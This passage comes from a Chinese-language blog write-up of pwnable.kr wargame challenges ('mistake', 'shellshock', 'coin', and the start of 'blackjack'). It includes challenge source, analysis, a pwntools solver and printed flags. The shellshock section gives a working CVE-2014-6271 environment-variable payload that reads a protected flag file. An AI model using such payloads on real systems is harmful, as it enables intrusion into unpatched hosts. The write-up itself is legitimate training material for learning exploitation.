PW_LEN<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Password OK\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong Password\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>题目给了提示</p><p>hint : operator priority</p><p>然后注意到这句<code>if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)</code>这里面的执行优先级是有问题的，应该为<code>if((fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400)) &lt; 0)</code>，错误的写法导致 fd=0，紧跟着 read 则会从 stdin里面读取 10 位长度内容作为 password</p><p>所以最终 pw_buf 和 pw_buf2 我们都能控制，只要保证每一位和 1 进行亦或即可</p><h3 id="解题-8"><a href="#解题-8" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">mistake@pwnable:~$ ./mistake do not bruteforce...0000000000input password : 1111111111Password OKMommy, the operator priority always confuses me :(</code></pre><h2 id="10-shellshock"><a href="#10-shellshock" class="headerlink" title="10. shellshock"></a>10. shellshock</h2><h3 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">setresuid</span><span class="token punctuation">(</span><span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setresgid</span><span class="token punctuation">(</span><span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/home/shellshock/bash -c 'echo shock_me'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>破壳漏洞的利用，<a href="https://zgao.top/bash%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Ecve-2014-6271%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">这篇文章</a>好点</p><p>查看有漏洞的 bash 版本</p><pre class=" language-shell"><code class="language-shell">shellshock@pwnable:~$ ./bash --versionGNU bash, version 4.2.25(1)-release (x86_64-pc-linux-gnu)</code></pre><p>同时注意到文件权限</p><pre class=" language-shell"><code class="language-shell">shellshock@pwnable:~$ ls -sailtotal 98023593359   4 drwxr-x---   5 root shellshock       4096 Oct 23  2016 .23593232   4 drwxr-xr-x 116 root root             4096 Apr 17 14:10 ..23593368 940 -r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash23593367   4 d---------   2 root root             4096 Oct 12  2014 .bash_history23593366   4 -r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag23593364   4 dr-xr-xr-x   2 root root             4096 Oct 12  2014 .irssi23593361   4 drwxr-xr-x   2 root root             4096 Oct 23  2016 .pwntools-cache23593363  12 -r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock23593360   4 -r--r--r--   1 root root              188 Oct 12  2014 shellshock.c</code></pre><h3 id="解题-9"><a href="#解题-9" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">shellshock@pwnable:~$ env x='() { :;}; /home/shellshock/bash -c "cat /home/shellshock/flag"' ./shellshockonly if I knew CVE-2014-6271 ten years ago..!!Segmentation fault (core dumped)</code></pre><h2 id="11-coin"><a href="#11-coin" class="headerlink" title="11. coin"></a>11. coin</h2><h3 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h3><pre class=" language-shell"><code class="language-shell">    ---------------------------------------------------    -              Shall we play a game?              -    ---------------------------------------------------    You have given some gold coins in your hand    however, there is one counterfeit coin among them    counterfeit coin looks exactly same as real coin    however, its weight is different from real one    real coin weighs 10, counterfeit coin weighes 9    help me to find the counterfeit coin with a scale    if you find 100 counterfeit coins, you will get reward :)    FYI, you have 60 seconds.    - How to play -     1. you get a number of coins (N) and number of chances (C)    2. then you specify a set of index numbers of coins to be weighed    3. you get the weight information    4. 2~3 repeats C time, then you give the answer    - Example -    [Server] N=4 C=2     # find counterfeit among 4 coins with 2 trial    [Client] 0 1         # weigh first and second coin    [Server] 20            # scale result : 20    [Client] 3            # weigh fourth coin    [Server] 10            # scale result : 10    [Client] 2             # counterfeit coin is third!    [Server] Correct!    - Ready? starting in 3 sec... -</code></pre><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p>二分法找 coin</p><h3 id="解题-10"><a href="#解题-10" class="headerlink" title="解题"></a>解题</h3><p>远程跑容易受到网络影响，推荐部署到<code>/tmp/</code>里本地跑，非常快</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">from</span> re <span class="token keyword">import</span> compileconn <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> <span class="token number">9007</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getList</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>str<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> list<span class="token punctuation">(</span>range<span class="token punctuation">(</span>int<span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>end<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    status <span class="token operator">=</span> <span class="token boolean">False</span>    data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[&lt;-] recv: %s"</span> <span class="token operator">%</span> data<span class="token punctuation">)</span>    NC <span class="token operator">=</span> compile<span class="token punctuation">(</span><span class="token string">"^N=([0-9]*) C=([0-9]*)$"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    W <span class="token operator">=</span> compile<span class="token punctuation">(</span><span class="token string">"^([0-9]*)$"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> NC<span class="token punctuation">:</span>        end <span class="token operator">=</span> int<span class="token punctuation">(</span>NC<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        fp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> end<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span>        sp <span class="token operator">=</span> <span class="token punctuation">(</span>end<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">,</span> end<span class="token punctuation">)</span>         status <span class="token operator">=</span> <span class="token boolean">True</span>      <span class="token keyword">elif</span> W<span class="token punctuation">:</span>        <span class="token keyword">if</span> int<span class="token punctuation">(</span>W<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">:</span>            fp <span class="token operator">=</span> sp        tp <span class="token operator">=</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> fp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> fp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span>        sp <span class="token operator">=</span> <span class="token punctuation">(</span>tp<span class="token punctuation">,</span> fp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        fp <span class="token operator">=</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tp<span class="token punctuation">)</span>        status <span class="token operator">=</span> <span class="token boolean">True</span>     <span class="token keyword">elif</span> <span class="token string">"format error"</span> <span class="token keyword">in</span> data <span class="token operator">or</span> <span class="token string">"time expired"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[>.&lt; Bye..."</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">if</span> status<span class="token punctuation">:</span>        data <span class="token operator">=</span> getList<span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> fp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[->] send: %s"</span> <span class="token operator">%</span> data<span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span></code></pre><pre class=" language-shell"><code class="language-shell">[<-] recv: Congrats! get your flagb1NaRy_S34rch1nG_1s_3asy_p3asy</code></pre><h2 id="12-blackjeck"><a href="#12-blackjeck" class="headerlink" title="12. blackjeck"></a>12. blackjeck</h2><h3 id="题目-11"><a href="#题目-11" class="headerlink" title="题目"></a>题目</h3><p>原地址：<a href="http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html" target="_blank" rel="noopener">http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</a></p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Programmer: Vladislav Shulman</span><span class="token comment" spellcheck="true">// Final Project</span><span class="token comment" spellcheck="true">// Blackjack</span><span class="token comment" spellcheck="true">// Feel free to use any and all parts of this program and claim it as your own work</span><span class="token comment" spellcheck="true">//FINAL DRAFT</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span>                </span><span class="token comment" spellcheck="true">//Used for srand((unsigned) time(NULL)) command</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;process.h></span>             </span><span class="token comment" spellcheck="true">//Used for system("cls") command</span><span class="token macro property">#<span class="token directive keyword">define</span> spade 06                 </span><span class="token comment" spellcheck="true">//Used to print spade symbol</span><span class="token macro property">#<span class="token directive keyword">define</span> club 05                  </span><span class="token comment" spellcheck="true">//Used to print club symbol</span><span class="token macro property">#<span class="token directive keyword">define</span> diamond 04               </span><span class="token comment" spellcheck="true">//Used to print diamond symbol</span><span class="token macro property">#<span class="token directive keyword">define</span> heart 03                 </span><span class="token comment" spellcheck="true">//Used to print heart symbol</span><span class="token macro property">#<span class="token directive keyword">define</span> RESULTS "Blackjack.txt"  </span><span class="token comment" spellcheck="true">//File name is Blackjack</span><span class="token comment" spellcheck="true">//Global Variables</span><span class="token keyword">int</span> k<span class="token punctuation">;</span><span class="token keyword">int</span> l<span class="token punctuation">;</span><span class="token keyword">int</span> d<span class="token punctuation">;</span><span class="token keyword">int</span> won<span class="token punctuation">;</span><span class="token keyword">int</span> loss<span class="token punctuation">;</span><span class="token keyword">int</span> cash <span class="token operator">=</span> <span class="token number">500</span><span class="token punctuation">;</span><span class="token keyword">int</span> bet<span class="token punctuation">;</span><span class="token keyword">int</span> random_card<span class="token punctuation">;</span><span class="token keyword">int</span> player_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> dealer_total<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Function Prototypes</span><span class="token keyword">int</span> <span class="token function">clubcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//Displays Club Card Image</span><span class="token keyword">int</span> <span class="token function">diamondcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//Displays Diamond Card Image</span><span class="token keyword">int</span> <span class="token function">heartcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//Displays Heart Card Image</span><span class="token keyword">int</span> <span class="token function">spadecard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//Displays Spade Card Image</span><span class="token keyword">int</span> <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//Generates random card</span><span class="token keyword">int</span> <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//Asks user amount to bet</span><span class="token keyword">void</span> <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//Asks user to continue</span><span class="token keyword">void</span> <span class="token function">rules</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Prints "Rules of Vlad's Blackjack" menu</span><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//Plays game</span><span class="token keyword">void</span> <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//Function to play for dealer AI</span><span class="token keyword">void</span> <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//Function for when user selects 'Stay'</span><span class="token keyword">void</span> <span class="token function">cash_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//Test for if user has cash remaining in purse</span><span class="token keyword">void</span> <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//Asks if user wants to continue playing</span><span class="token keyword">void</span> <span class="token function">fileresults</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//Prints results into Blackjack.txt file in program directory</span><span class="token comment" spellcheck="true">//Main Function</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> choice1<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n              222                111                            "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n            222 222            11111                              "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n           222   222          11 111                            "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                222              111                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n               222               111                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c%c%c     %c%c            %c%c         %c%c%c%c%c    %c    %c                "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c    %c    %c%c           %c  %c       %c     %c   %c   %c              "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c    %c    %c%c          %c    %c     %c          %c  %c               "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c%c%c     %c%c          %c %c%c %c     %c          %c %c              "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c    %c    %c%c         %c %c%c%c%c %c    %c          %c%c %c             "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                           <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c     %c   %c%c         %c      %c    %c          %c   %c               "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                                             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c     %c   %c%c        %c        %c    %c     %c   %c    %c             "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c%c%c%c    %c%c%c%c%c%c%c   %c        %c     %c%c%c%c%c    %c     %c            "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                        21                                   "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     %c%c%c%c%c%c%c%c      %c%c         %c%c%c%c%c    %c    %c                "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c        %c  %c       %c     %c   %c   %c              "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c       %c    %c     %c          %c  %c               "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                               <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c       %c %c%c %c     %c          %c %c              "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c      %c %c%c%c%c %c    %c          %c%c %c             "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c      %c      %c    %c          %c   %c               "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     %c  %c%c     %c        %c    %c     %c   %c    %c             "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c%c%c      %c        %c     %c%c%c%c%c    %c     %c            "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                                                                            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n         222                     111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        222                      111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n       222                       111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      222222222222222      111111111111111                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      2222222222222222    11111111111111111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//end program</span><span class="token keyword">void</span> <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token 